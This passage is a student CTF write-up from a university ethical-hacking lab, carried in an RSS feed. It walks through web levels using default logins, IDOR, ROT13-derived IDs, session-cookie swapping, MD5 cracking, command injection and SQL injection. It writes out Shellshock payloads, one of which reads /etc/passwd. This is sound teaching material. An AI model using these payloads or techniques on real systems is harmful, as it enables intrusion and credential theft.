attention so we searched for the file called: &lt;em&gt;secret.txt&lt;/em&gt;, in the current web directory. As we knew the URL was nothing else than a path to a file in a webserver, and we added &lt;em&gt;secret.txt&lt;/em&gt; to the urr to the URL in order to find it.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image51.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;At this point, we needed to find the secret at &lt;em&gt;cgi-bin/getsecret.js&lt;/em&gt; and referred to ourselves as &lt;em&gt;di.uniroma1.it/supersecurepage&lt;/em&gt;, which could be done with the Firefox extension as done in the previous levels.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image53.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After having done this, we were able to find the URL to the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image55.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The URL for the level 6 obtained by solving the level 5:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55005/oaxiweitheerohra&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image57.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Here we applied the usual method of trying one of the most common combination of username and password (admin:admin).&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image59.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Digging in the source code and reading it did not reveal anything. So, we turned our attention to the URL, and we found a reference to a PHP script with the field &lt;em&gt;uid&lt;/em&gt; exposed &lt;em&gt;userinfo.php?uid=0&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image60.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The field was set to 0 which was our current user’s ID, so we tried to change it with 1 and we were sent to another web page, Angelo&apos;s web page. Then we started to change the value of uid until we found the user with the secret at &lt;em&gt;uid=6&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image61.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The URL found by solving level 6:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55215/shieduekecometha/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image62.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As stated in the picture, in order to log in we need an e-mail and the username.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image24.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;So, we tried a fake and random email and a random string as a password. At that point, we noticed that the site check if the username was an e-mail just by checking if the username string contained the character &lt;em&gt;@&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image26.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;We could try to insert any kind of random email for instance &lt;em&gt;admin@admin&lt;/em&gt; or even &lt;em&gt;teacher@something&lt;/em&gt; but we always received the same kind of message. After having tried some standard types of email, we thought that we could try by inserting a real teacher’s email address.&lt;/p&gt;&lt;p&gt;Our first attempt was to try with course main teacher&amp;rsquo;s email but it was not the right solution. Then we tried again with our laboratorys teacher&amp;rsquo;s email and finally, that one was the key solution for the next level because we were able to log in as a teacher and consequently obtain the link for the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image29.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image31.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Let’s start with the URL obtained from the previous levels:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55493/zangiepaegaizeex/cgi-bin/index.php&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image33.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Our first attempt was as usual the standard combination of &lt;em&gt;admin:admin&lt;/em&gt; as username and password.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image35.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;And we noticed a code in the URL which should be the ID of the current user.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image37.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;We tried to figure it out why the current user (admin) has that precise value, and we also noticed that the string &lt;em&gt;admin&lt;/em&gt; and the string &lt;em&gt;nqzva&lt;/em&gt; had the same length, so we started to match the characters from the first string with the ones from the other string hence &lt;em&gt;a=n&lt;/em&gt;, &lt;em&gt;d=q&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;We immediately notice that the distance between the characters was 13, so we tried to ROT13 the string &lt;em&gt;admin&lt;/em&gt; and the result string was &lt;em&gt;nqzva&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;After many random tries, our attention was captured by the sentence &lt;em&gt;“Page created by MessyAdmin”&lt;/em&gt; present on the first page of the level.&lt;/p&gt;&lt;p&gt;So, we decide to ROT13 the string &lt;em&gt;messyadmin&lt;/em&gt; which resulted in &lt;em&gt;zrfflnqzva&lt;/em&gt; which has been copied and pasted to the URL instead of &lt;em&gt;nqzva&lt;/em&gt; and we ended up with the MessyAdmin’s page where we found the link to the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image38.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image39.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;URL obtained from the 8th level:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55413/eereezeighohfeim&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image40.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first thing we do was to try the &lt;em&gt;admin@admin:admin&lt;/em&gt; username and password combination but without success. Then we investigated the source code looking for some information and we found a comment that said &lt;em&gt;“Never show the sessions.txt file”&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As usual, we proceede to change the URL trying to open the &lt;em&gt;sessions.txt&lt;/em&gt; file.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After having seen the information in this file, we immediately understood what we had to do because we already knew about an attack where if you can steal a user session you can log in as that user.&lt;/p&gt;&lt;p&gt;While this session was saved in the cookie, we proceeded to open the cookie and change the value. To obtain the cookie we had to log in as a Guest user.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Once in the page, we check if we received the cookie.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;We notice that the value of this cookie was different from the value found in the &lt;em&gt;sessions.txt&lt;/em&gt; file.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;So, we proceede to change it, and our new cookie was:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After reloading the page, we end up in the administrator’s page and logged as him, where we could find the link for the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The link obtained from level 9:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55255/leighaghuuzasaex/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image15.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As usual, we tried the same combination (admin:admin) without any success.&lt;/p&gt;&lt;p&gt;Then we tried many random combinations of usernames and passwords, for instance, we used some teachers’ usernames just in case we could get it correct, but it failed every time.&lt;/p&gt;&lt;p&gt;The last attempt was to analyse the source code of the web page where we found the following script:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image16.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Inside the script, there was a variable called &lt;em&gt;password_hashes&lt;/em&gt; which contained the correspondent encrypted password for each user.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image17.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first thing that came into our mind was MD5, so we proceeded to decrypt the hash with an online tool &lt;em&gt;haskiller.co.uk&lt;/em&gt; (this site does not exit any more). It resulted in a very good website where it was possible to encrypt and decrypt by using various algorithms.&lt;/p&gt;&lt;p&gt;In addition, you could also download their wordlist in case you need to proceed with an offline hash cracking.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image66.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Obviously, we took the hash of the user &lt;em&gt;admin&lt;/em&gt; and try to log in with the new credential &lt;em&gt;admin:qwertyuiop&lt;/em&gt; and we succeeded in proceeding to the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image68.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;But it did not end here because after decrypting the hash we notice that the function &lt;em&gt;checkPassword&lt;/em&gt; does not decrypt the user input in order to access the admin page.&lt;/p&gt;&lt;p&gt;So, we tried to reverse the function to understand its logic.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image69.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The function follows these steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Retrieve the values from the form and hash the given password.&lt;/li&gt;&lt;li&gt;It checks if the given user as input in the login form was in the dictionary “password_hashes”, if not it gives an error.&lt;/li&gt;&lt;li&gt;If the user exists, it checks the computed hash with the stored hash, if they don’t match it gives an error.&lt;/li&gt;&lt;li&gt;If the hash matches, it generates the link for the next level by hashing again the input hash and taking the initial 8 characters.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;We followed the script steps in order to solve the level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image71.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;In fact, we can access the right page by adding &lt;em&gt;62aa4dcf.html&lt;/em&gt; as the script was doing.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image74.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;We started from the following URL:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55025/eepugeighovoorou/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image76.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first attempt was to use a few commonly used numbers such as &lt;em&gt;0000&lt;/em&gt;, &lt;em&gt;12345&lt;/em&gt;, &lt;em&gt;1337&lt;/em&gt; but without any success.&lt;/p&gt;&lt;p&gt;As usual, we proceede to analyze the source code where we found a script like the previous levels and our attention was caught by a function called &lt;em&gt;checkPassword&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image79.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As we can see the &lt;code&gt;if&lt;/code&gt; statement checks if the number was between 1 and 1000000 excluded, if it was &lt;em&gt;NaN&lt;/em&gt; (empty form) and if it hah at least six digits.&lt;/p&gt;&lt;p&gt;So, we supposed that a valid code could have been a number between 1 and 999999. Then the function hashes the code with MD5 with the salt &lt;em&gt;localsalt&lt;/em&gt; and checks if the result hashing was equal to &lt;em&gt;4d1ea4c067daa4dec768540bbcfe80b2&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;The first idea was to decrypt the hash to retrieve the right value but due to the lack of an online tool we proceeded to hash with salt all the passwords from 1 to 99999 and check which one matched the string: &lt;em&gt;“4d1ea4c067daa4dec768540bbcfe80b2”&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;In order to do it we wrote a Python script.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image81.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;And this was the result produced by the script.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image83.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As expected, the code worked fine.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image85.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The URL obtained from level 11:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55528/ithochexephizoof&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image65.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;In this case, there was no form or text box where to write so we proceede by analyzing the code where, as usual, we found a script and we focused on a portion of the code.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image44.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Here, we can see that the script creates a new link concatenating two strings to complete the URL.&lt;/p&gt;&lt;p&gt;These strings were: &lt;em&gt;“cgi-bin/users.php”&lt;/em&gt; and &lt;em&gt;“?filter=”&lt;/em&gt;, after which a value was concatenated, but we didn&amp;rsquo;t know which kind of value could follow the string.&lt;/p&gt;&lt;p&gt;We decide to copy and paste the strings to the URL to complete it ourselves and append something in order to execute an XSS since it was JavaScript.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image45.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;We tried several times but for some reason, no one of our attempts worked (in addition, we were not really good in JavaScript!).&lt;/p&gt;&lt;p&gt;Then we noticed what the home page was prompting: &lt;em&gt;daemon&lt;/em&gt;, &lt;em&gt;root&lt;/em&gt;, and &lt;em&gt;mysql&lt;/em&gt;, things that reminded us of Linux users so we tried to execute a simple Linux command instead of a JavaScript one.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image46.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Once find the files in the directory we could try to open &lt;em&gt;secretusers.txt&lt;/em&gt; with the command &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;And the file contain the link for the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image48.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The starting point was the URL obtained from the previous level:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55277/neifeesuopheeghu/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image50.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first thing we did was to write something in the text box to see what happens and we tried many different kinds of values to check how well it validated the input.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image52.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As usuals we proceede to analyze the code in search of information or scripts to reverse. In fact, we fpund a script, and in particular we focused our attention on the function “getenv”.&lt;/p&gt;&lt;p&gt;In addition, we saw the sanitize function on the user input which removes the illegal character from the input: that was the reason why it did not generate any kind of error.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image54.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Also, here we could see the making of the URL like the previous levels so we attempted the same method as in the level 12 without any success.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image56.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The response was &lt;i&gt;“no variable found”&lt;/i&gt; and also when we put an input it prints a &lt;i&gt;“TESTENV”&lt;/i&gt; which recalls something similar to the bash environment variable so we decided to do some research to see if there were any vulnerabilities with the bash in the past or something similar.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image58.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first thing we found was something called “Shellshock”. The document explained what and how to exploit this vulnerability providing the string to use in order to execute remote shell commands.&lt;/p&gt;&lt;p&gt;The string was: &lt;code&gt;() { :;}; echo “NS:” $(&amp;lt;/etc/passwd)&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Digging more into the topic we found a &lt;a href=&quot;https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf&quot;&gt;PDF&lt;/a&gt; where the shellshock vulnerability was explained alongside its syntax.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image41.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;So again, we tried to remake the right link appending &lt;em&gt;cgi-bin/env.php?filter=&lt;/em&gt; and tried to copy and paste the string suggested but for some reason, no one of the strings were working.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image42.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;During the laboratory lessons, we were suggested by the teacher to use &lt;strong&gt;Burp&lt;/strong&gt; so we tried again with it.&lt;/p&gt;&lt;p&gt;The first thing we did was to copy and paste the payload found on the internet on the link like we did with the browser but without any success.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image22.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After a few research and random tries, we figured out that we have to encode a few characters and substitute the spaces with &lt;em&gt;+&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;So we encoded the “:” and “;” with “%3a” and “%3b” following the guide in this link, and our resulting payload was &lt;code&gt;()+{+%3a%3b}+/bin/ls&lt;/code&gt; but still did not work for some reason.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image23.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Then we remembered, after a lot of struggle, a file called &lt;em&gt;“user.php”&lt;/em&gt; on level 12 which has a particular comment.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image25.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The referrer was disabled for that level and maybe it was enabled in this one, so we tried to add the referrer in our level URL.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image27.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Which works perfectly, and we succeeded in listing the directory content.&lt;/p&gt;&lt;p&gt;The next step was to read the &lt;em&gt;secret4uou0.txt&lt;/em&gt; with the command &lt;code&gt;cat&lt;/code&gt; and we sent the payload with a different command &lt;code&gt;/bin/cat+secret4uou0.txt&lt;/code&gt; where we found the link for the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image30.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The starting point was the URL obtained from the previous level:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55424/aetiasaeghongohx&lt;/code&gt;&lt;/p&gt;&lt;p&gt;At the beginning of this level, we had no idea what to do, we try to register a user, we try to log in as &lt;em&gt;admin:admin&lt;/em&gt; but nothing, then we remembered our Lab class on XSS attack and we try to do it but without success.&lt;/p&gt;&lt;p&gt;Only after few days later we had a class on SQL Injection then we tried to do so.&lt;/p&gt;&lt;p&gt;First of all, we had to find where the vulnerability was, it could be in a form, since it was very common to find them, or we could perform an injection from the URL.&lt;/p&gt;&lt;p&gt;We checked all the forms by writing inside the “ ’ ” character to see if we would get any query error, and we found it on the page “new user” on the field “username”.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image32.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Since the class material was not published yet we used a friend presentation about the JSQL Injection from &lt;a href=&quot;https://github.com/edoardoPredieri/SQLinjection_Training/blob/master/SQL_Injection.pptx&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;So, our first attempt was to find the number of columns, by doing the queries until we reached the 6th.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image34.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;And saw where were the leaks:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image36.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Once found that leaks were on row 1, 3 and 4, we tried to find the schema names with the following query.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image19.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The schema found did not help us.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image20.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;This was really helpful when there were many databases but this was not the case, so we proceeded on finding the tables.&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image21.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The result shows a lot of names of tables but we were looking for something particular where it was possible to find users information.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The “users” table seemed to perfectly fit our case, so subsequently it was possible to retrieve the column names.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Due to a bad query without the “WHERE” statement it shows all the columns on the database but luckily, we managed to find the interested columns.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image5.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;At this point we have all the necessary information to try to retrieve the credentials of the users.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Also, this query gives us as result few credentials (username and password) but we had to choose only two of them.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;After reading their blogs we found the link of the next level on Tsutomu’s blog.&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image11.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</content>
        
          <category term="medium"/>
        
          <category term="ctf"/>
        
          <category term="web"/>
        
          <category term="security"/>
        
          <category term="sqli"/>
        
          <category term="shellshock"/>
        
          <category term="http header"/>
        
          <category term="code injection"/>
        
          <category term="bruteforcing"/>
        
          <category term="rot13"/>
        
          <category term="login panel"/>
        
      </item>
    
    
  </channel>
</rss>